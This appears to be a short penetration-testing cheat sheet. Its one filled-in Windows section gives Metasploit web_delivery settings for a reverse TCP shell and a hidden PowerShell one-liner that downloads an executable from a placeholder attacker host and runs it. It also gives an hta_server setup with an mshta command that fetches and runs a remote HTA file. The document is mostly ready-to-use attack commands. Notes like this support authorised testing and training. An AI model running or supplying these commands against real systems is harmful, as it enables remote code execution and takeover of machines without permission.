### Vulnerability Scanning
### Searching For Exploits

### Windows Privilege Escalation
```
use exploit/multi/script/web_delivery
set target PSH\ (Binary)
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand false
set LHOST <ip>

powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\oPY153Pv.exe')"; (new-object System.Net.WebClient).DownloadFile('http://<ip>:<port>/5YaTnDgYGm1KPK', $z); invoke-item $z
```
-  Listens on `8080` (Web) and `4444` (shell) by default after running `exploit`. Run generated PowerShell code on target to get a shell.

#### MSHTA
```
runas.exe /user:<username> cmd

use exploit/windows/misc/hta_server
exploit

mshta.exe http://<ip>:<port>/<filename>.hta
```
